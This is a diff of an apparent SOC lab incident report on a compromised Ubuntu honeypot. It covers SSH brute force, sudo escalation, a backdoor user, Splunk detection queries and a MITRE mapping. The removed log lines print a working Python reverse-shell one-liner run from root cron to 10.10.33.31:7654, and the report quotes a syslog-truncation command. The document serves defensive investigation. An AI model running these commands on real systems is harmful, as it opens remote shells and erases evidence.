@@ -1,96 +1,102 @@
-	# Time	Event
+# SOC Incident Report – Ubuntu Server Compromise
 
-12/08/2025
-09:52:57.200	
-2025-08-12T09:52:57.200559+00:00 deceptipot-demo useradd[2709]: new user: name=remote-ssh, UID=1004, GID=1004, home=/home/remote-ssh, shell=/bin/sh, from=/dev/pts/2
-host = ce-splunksource = auth.logsourcetype = linux_secure
+## Overview
+This report documents a confirmed compromise of the Ubuntu server (`deceptipot-demo`).  The investigation in Splunk (`index=task5`) revealed a full attack lifecycle: SSH brute-force, valid credential access, privilege escalation, persistence via new user creation, reverse shell executionand log tampering.
 
-12/08/2025
-09:52:57.200	
-2025-08-12T09:52:57.200420+00:00 deceptipot-demo useradd[2709]: new group: name=remote-ssh, GID=1004
-host = ce-splunksource = auth.logsourcetype = linux_secure
+---
+## Log Source
+- **SIEM:** Splunk
+- **Index:** `task5`
+- **Host:** `deceptipot-demo`  - **Logs:** auth.log/sudo logs/syslog/cron
+  
+---
 
-12/08/2025
-09:52:57.170	
-2025-08-12T09:52:57.170059+00:00 deceptipot-demo sudo:     root : TTY=pts/1 ; PWD=/home/jack-brown ; USER=root ; COMMAND=/usr/sbin/useradd remote-ssh
-host = ce-splunksource = auth.logsourcetype = linux_secure
+ ## Investigation Queries
+
+### 1.SSH Brute Force Detection
+index=task5 source="auth.log" *ubuntu* process=sshd  
+| search "Accepted password" OR "Failed password"
+
+- Used to identify SSH brute-force attempts and authentication activity.
+
+### 2.Failed Login Analysis + Authentication Events
+index=task5 source="auth.log" *su*
+| sort + _time
+
+-Used to correlate failed attempts, user access, and privilege-related authentication events.
+
+### 3.Privilege Escalation (sudo )
+index=task5 source="auth.log"
+("sudo" OR "session opened for user root")
+| sort _time
+
+-Detects escalation of privileges to root.
+
+### 4.Persistence & Execution via Cron (Command Execution)
+index=task5 sourcetype=syslog ("CRON" OR "cron")
+| search ("python" OR "perl" OR "ruby" OR ".sh" OR "bash" OR "nc")
+
+-Identifies scheduled task execution and potential malicious scripts (reverse shell / payload execution).
+
+### Summary of Query Logic
+-Query 1: SSH brute force + authentication attempts
+->> 2: Authentication + sudo-related activity correlation
+->> 3: Root privilege escalation detection
+->>4: Cron-based persistence and command execution (C2 / reverse shell indicators
+
+-----
+
+## Key Findings
+
+### 1.SSH Brute Force Activity
+Source IP: 10.14.94.82
+Target user: jack-brown
+Multiple failed login attempts detected-4
 
 
-**index=task5 process=sshd 
-| search "Accepted password" OR "Failed password"**
+### 2.Successful Authentication
+User: jack-brown / ubuntu
+Source IP: 10.14.94.82
 
 
-	Time	Event
-
-12/08/2025
-10:00:01.270	
-2025-08-12T10:00:01.270628+00:00 deceptipot-demo CRON[3042]: (root) CMD (/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.33.31",7654));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /tmp/cron_output.log 2>&1)
-host = deceptipot-demosource = syslogsourcetype = syslog
-
-12/08/2025
-09:55:01.259	
-2025-08-12T09:55:01.259537+00:00 deceptipot-demo CRON[2971]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
-host = deceptipot-demosource = syslogsourcetype = syslog
-**index=task5 source="syslog" 
-|  search cron Cron**
+### 3.Privilege Escalation
+User: jack-brown
+Root access via sudo
 
 
-raw	_time
- 	 	10	12	0	august	1	tuesday	2025	0	deceptipot-demo	deceptipot-demo	
-nix-all-logs
-nix_ta_data
-deceptipot-demo	task5	1	 	 	subprocess.call(["/bin/sh","-i"])	3042	CRON	--::.+:_-_[]:_()__(///_-_'_,,;=.(.,.);.(("...",));	socket.socket(socket.AF_INET,socket.SOCK_STREAM)	 	syslog	syslog	ce-splunk	 	 	 	 	 	 	32	0	nix	2025-08-12T10:00:01.270628+00:00 deceptipot-demo CRON[3042]: (root) CMD (/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.33.31",7654));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /tmp/cron_output.log 2>&1)
+### 4.Persistence Mechanism
+User created: remote-ssh
+UID: 1004
+Shell: /bin/sh
 
 
- 	1004	 	 	1004	 	created	 	 	AAA	useradd	9	12	52	august	57	tuesday	2025	0	 	 	 	 	
-nix-all-logs
-nix_security
-nix_ta_data
-useradd
-/dev/pts/2	/home/remote-ssh	ce-splunk	task5	1	remote-ssh	remote-ssh	1004	user	1004	/home/remote-ssh	2709	useradd	--::.+:_-_[]:__:_=-,_=,_=,_=//-,_=//,_=///	 	 	 	/bin/sh	 	auth.log	linux_secure	ce-splunk	 	 	 	 	 	 	 	 	 	 	success	
-account
-add
-change
-interactive
-management
-os
-unix
- 	
-account
-add
-change
-management
-os
-unix
-interactive	32	0	 	 	remote-ssh	 	remote-ssh	 	 	added	nix	2025-08-12T09:52:57.200559+00:00 deceptipot-demo useradd[2709]: new user: name=remote-ssh, UID=1004, GID=1004, home=/home/remote-ssh, shell=/bin/sh, from=/dev/pts/2	2025-08-12 09:52:57.200
- 	1004	 	 	 	 	 	 	 	 	 	9	12	52	august	57	tuesday	2025	0	 	 	 	 	
-nix-all-logs
-nix_security
-nix_ta_data
- 	 	ce-splunk	task5	1	remote-ssh	 	 	 	 	 	2709	useradd	--::.+:_-_[]:__:_=-,_=	 	 	 	 	 	auth.log	linux_secure	ce-splunk	 	 	 	 	 	 	 	 	 	 	 	
-os
-unix
- 	
-os
-unix
- 	32	0	 	 	 	 	 	 	 	 	nix	2025-08-12T09:52:57.200420+00:00 deceptipot-demo useradd[2709]: new group: name=remote-ssh, GID=1004	2025-08-12 09:52:57.200
-/usr/sbin/useradd	 	/home/jack-brown	pts/1	 	root	 	 	 	 	 	9	12	52	august	57	tuesday	2025	0	 	 	 	 	
-nix-all-logs
-nix_security
-nix_ta_data
-useradd
- 	 	ce-splunk	task5	1	 	 	 	 	 	 	 	sudo	--::.+:_-_:______:_=/_;_=//-_;_=_;_=///_-	 	 	 	 	 	auth.log	linux_secure	ce-splunk	 	 	 	 	 	 	 	 	 	 	 	
-account
-add
-change
-management
-os
-unix
- 	
-account
-add
-change
-management
-os
-unix
- 	32	0	 	 	 	 	 	 	 	 	nix	2025-08-12T09:52:57.170059+00:00 deceptipot-demo sudo:     root : TTY=pts/1 ; PWD=/home/jack-brown ; USER=root ; COMMAND=/usr/sbin/useradd remote-ssh	2025-08-12 09:52:57.170
+### 5.Command&Control
+IP: 10.10.33.31
+Port: 7654
+Reverse shell executed via cron job
+
+### Log Tampering
+/usr/bin/truncate -s 0 /var/log/syslog
+
+## Timeline 
+TimeEvent09:49Log tampering begins (/var/log/syslog truncated)09:50SSH brute-force attempts from 10.14.94.8209:51Successful login (jack-brown)09:52:57User remote-ssh created09:53Additional login observed (ubuntu)10:00Reverse shell executed via cron (10.10.33.31:7654
+
+------
+
+## MITRE ATT&CK Mapping
+T1110 – Brute Force
+T1078 – Valid Accounts
+T1068 – Privilege escalationT1136 – vcreate Account
+T1053 – Scheduled Tasks / Cronjobs
+T1071 – Command & Control
+T1070.002 – Indicator Removal (Log Deletion)
+T1021 – Remote Services (SSH)
+T1059 – Command Execution
+
+-------
+
+## Conclusion
+Conclusion: The Ubuntu server was compromised. The attackers gained initial access through an SSH brute-force attack and then escalated privileges to root. They also created a persistent backdoor by adding a user named “remote-ssh” in order to regain access to the system later. A reverse shell was used for C2 communication.
+
+
+---
